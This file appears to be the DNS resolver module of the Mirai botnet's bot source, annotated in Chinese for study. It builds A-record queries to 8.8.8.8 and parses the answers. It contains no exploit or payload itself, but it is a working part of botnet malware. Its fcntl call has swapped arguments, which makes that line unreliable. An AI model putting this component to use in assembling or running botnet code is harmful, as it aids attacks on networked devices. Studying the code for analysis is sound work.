#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <sys/select.h>
#include <errno.h>

#include "includes.h"
#include "resolv.h"
#include "util.h"
#include "rand.h"
#include "protocol.h"

/******resolv.c******
*处理域名的解析，参考DNS报文格式
*/

//域名按字符'.'进行划分，并保存各段长度，构造DNS请求包时会用到
//src_domain是从DNS数据包中解析出来的完整域名
//通过该函数解析出各个子域名并存储在dst_hostname中
void resolv_domain_to_hostname(char *dst_hostname, char *src_domain)
{
    int len = util_strlen(src_domain) + 1;
    char *lbl = dst_hostname, *dst_pos = dst_hostname + 1;
    uint8_t curr_len = 0;
    //以.分割各个子域名，存储格式如下：
    //第一个字节存储当前子域名的长度，然后存储子域名本身
    //注意观察dns的Queries部分就是这样存储的
    //对于一个域名就是：一字节的子域名1长度 + 子域名1 + 一字节的子域名2长度 + 子域名2 + 一字节的子域名3长度 + 子域名3
    while (len-- > 0)
    {
        char c = *src_domain++;

        if (c == '.' || c == 0)
        {
            *lbl = curr_len;
            lbl = dst_pos++;
            curr_len = 0;
        }
        else
        {
            curr_len++;
            *dst_pos++ = c;
        }
    }
    *dst_pos = 0;
}

//处理DNS响应包中的解析结果，可参照DNS数据包结构
//http://c.biancheng.net/view/6457.html
static void resolv_skip_name(uint8_t *reader, uint8_t *buffer, int *count)
{
    unsigned int jumped = 0, offset;
    *count = 1;
    while(*reader != 0)
    {
        if(*reader >= 192)  //大于C0，说明使用了压缩
        {   //两个字节的值减去C000，得到offset
            offset = (*reader)*256 + *(reader+1) - 49152;
            reader = buffer + offset - 1;  //reader存储了当前answer对应的域名
            jumped = 1;
        }
        reader = reader+1;
        if(jumped == 0)
            *count = *count + 1;
    }

    if(jumped == 1)
        *count = *count + 1;
}

//构造DNS请求包向8.8.8.8进行域名解析，并获取响应包中的IP
struct resolv_entries *resolv_lookup(char *domain)
{
    struct resolv_entries *entries = calloc(1, sizeof (struct resolv_entries));
    char query[2048], response[2048];
    //query构造dns请求包
    //首先是dns header，包括了id, opts, qdcount, ancount, nscount, arcount;
    struct dnshdr *dnsh = (struct dnshdr *)query;
    //
    char *qname = (char *)(dnsh + 1); //从quary起始地址偏移dnshdr后开始，存储了分段后的拟查询域名，下面接着存储query的type和class

    resolv_domain_to_hostname(qname, domain);
    
    //最后+1是保证域名后面有个\0
    struct dns_question *dnst = (struct dns_question *)(qname + util_strlen(qname) + 1); //在qname存储之后，在后面的缓冲区构建dns的问题部分
    struct sockaddr_in addr = {0};
    int query_len = sizeof (struct dnshdr) + util_strlen(qname) + 1 + sizeof (struct dns_question);
    int tries = 0, fd = -1, i = 0;
    uint16_t dns_id = rand_next() % 0xffff;  //随机生成一个dns id


    util_zero(&addr, sizeof (struct sockaddr_in));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INET_ADDR(8,8,8,8);
    addr.sin_port = htons(53);

    // Set up the dns query
    dnsh->id = dns_id;
    dnsh->opts = htons(1 << 8); // Recursion desired
    dnsh->qdcount = htons(1);   //有一个请求的问题
    dnst->qtype = htons(PROTO_DNS_QTYPE_A);
    dnst->qclass = htons(PROTO_DNS_QCLASS_IP);
    //以上完成了DNS数据包的构造

    while (tries++ < 5)
    {
        fd_set fdset;
        struct timeval timeo;
        int nfds;

        if (fd != -1)
            close(fd);
        if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)  //UDP IPV4
        {
#ifdef DEBUG
            printf("[resolv] Failed to create socket\n");
#endif
            sleep(1);
            continue;
        }
        //
        if (connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
        {
#ifdef DEBUG
            printf("[resolv] Failed to call connect on udp socket\n");
#endif
            sleep(1);
            continue;
        }
        //基于UDP/IP发送DNS请求数据包
        //Linux 下当连接断开，还发送数据的时候，不仅 send() 的返回值会有反映，而且还会向系统发送一个异常消息，
        //如果不作处理，系统会出 BrokePipe，程序会退出，这对于服务器提供稳定的服务将造成巨大的灾难。
        //一旦连接端口，还在发数据，client端会被kill
        //为此，send() 函数的最后一个参数可以设置为 MSG_NOSIGNAL，禁止 send() 函数向系统发送异常消息。
        if (send(fd, query, query_len, MSG_NOSIGNAL) == -1)
        {
#ifdef DEBUG
            printf("[resolv] Failed to send packet: %d\n", errno);
#endif
            sleep(1);
            continue;
        }
        //fcntl可以改变已打开的文件性质
        fcntl(F_SETFL, fd, O_NONBLOCK | fcntl(F_GETFL, fd, 0));  //设置为非阻塞
        FD_ZERO(&fdset);
        FD_SET(fd, &fdset);

        timeo.tv_sec = 5;
        timeo.tv_usec = 0;
        nfds = select(fd + 1, &fdset, NULL, NULL, &timeo);

        if (nfds == -1)
        {
#ifdef DEBUG
            printf("[resolv] select() failed\n");
#endif
            break;
        }
        else if (nfds == 0)
        {
#ifdef DEBUG
            printf("[resolv] Couldn't resolve %s in time. %d tr%s\n", domain, tries, tries == 1 ? "y" : "ies");
#endif
            continue;
        }
        else if (FD_ISSET(fd, &fdset))
        {
#ifdef DEBUG
            printf("[resolv] Got response from select\n");
#endif
            int ret = recvfrom(fd, response, sizeof (response), MSG_NOSIGNAL, NULL, NULL);  //收到了DNS返回包
            char *name;
            struct dnsans *dnsa;
            uint16_t ancount;
            int stop;
            //返回包包含了请求包的全部，再额外加上answer的部分，因此肯定要比原来dns请求包大
            if (ret < (sizeof (struct dnshdr) + util_strlen(qname) + 1 + sizeof (struct dns_question)))
                continue;
            
            dnsh = (struct dnshdr *)response; //获取dns返回包的包头
            qname = (char *)(dnsh + 1);        //获取查询域名
            dnst = (struct dns_question *)(qname + util_strlen(qname) + 1); //获取查询域名的查询类型等
            name = (char *)(dnst + 1);//接下来是answer部分

            if (dnsh->id != dns_id)  //请求包和对应的返回包的id应该一致
                continue;
            if (dnsh->ancount == 0)
                continue;

            ancount = ntohs(dnsh->ancount);  //返回的answer条目数量
            while (ancount-- > 0)   //遍历所有answer条目，获取类型为A的条目
            {
                struct dns_resource *r_data = NULL;
                //由于DNS消息压缩机制，相同的域名不重复存储，而是使用C0|offset的方式
                //https://blog.csdn.net/xth21/article/details/104469241
                resolv_skip_name(name, response, &stop);
                name = name + stop;   //此时name指向解析完压缩/未压缩域名之后的部分

                r_data = (struct dns_resource *)name; //type, class，ttl，data_len
                name = name + sizeof(struct dns_resource);  //指向data_len字段后面的部分，也就是IP地址值

                if (r_data->type == htons(PROTO_DNS_QTYPE_A) && r_data->_class == htons(PROTO_DNS_QCLASS_IP))
                {   //只解析A类型【IPV4】
                    if (ntohs(r_data->data_len) == 4)
                    {
                        uint32_t *p;
                        uint8_t tmp_buf[4];
                        for(i = 0; i < 4; i++)
                            tmp_buf[i] = name[i];

                        p = (uint32_t *)tmp_buf;  //DNS请求包返回的IP

                        entries->addrs = realloc(entries->addrs, (entries->addrs_len + 1) * sizeof (ipv4_t));
                        entries->addrs[entries->addrs_len++] = (*p);
#ifdef DEBUG
                        printf("[resolv] Found IP address: %08x\n", (*p));
#endif
                    }

                    name = name + ntohs(r_data->data_len); //指向下一个answer条目
                } else {
                    resolv_skip_name(name, response, &stop);
                    name = name + stop;
                }
            } //只遍历answer条目，不考虑authoritative nameserver部分
        }

        break;
    }

    close(fd);

#ifdef DEBUG
    printf("Resolved %s to %d IPv4 addresses\n", domain, entries->addrs_len);
#endif

    if (entries->addrs_len > 0)
        return entries;   //返回请求域名的ip字段和ip长度
    else
    {
        resolv_entries_free(entries);
        return NULL;
    }
}

//释放用来保存域名解析结果的空间
void resolv_entries_free(struct resolv_entries *entries)
{
    if (entries == NULL)
        return;
    if (entries->addrs != NULL)
        free(entries->addrs);
    free(entries);
}
